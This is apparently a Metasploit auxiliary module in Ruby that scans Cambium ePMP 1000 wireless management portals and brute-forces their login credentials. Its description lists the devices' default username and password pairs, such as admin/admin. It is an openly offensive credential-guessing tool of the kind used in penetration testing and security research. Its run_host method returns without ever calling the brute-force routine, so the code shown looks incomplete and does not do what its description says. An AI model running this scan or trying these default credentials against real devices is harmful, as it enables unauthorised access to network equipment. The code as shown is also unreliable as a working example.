##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::EPMP

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Cambium ePMP 1000 Login Scanner',
      'Description' => %{
        This module scans for Cambium ePMP 1000 management login portal(s), and
        attempts to identify valid credentials. Default login credentials are -
        admin/admin, installer/installer, home/home and readonly/readonly.
      },
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'References' =>
        [
          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/']
        ],
      'License'        => MSF_LICENSE
     )
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'admin'])
      ], self.class
    )
  end

  def run_host(ip)
    unless is_app_epmp1000?
      return
    end
  end

  #
  # Brute-force the login page
  #

  def do_login(epmp_ver)
    if epmp_ver < '3.4.1' # <3.4.1 uses login_1
      each_user_pass do |user, pass|
        login_1(user, pass, epmp_ver)
      end
    else
      each_user_pass do |user, pass|
        login_2(user, pass, epmp_ver)
      end
    end
  end
end
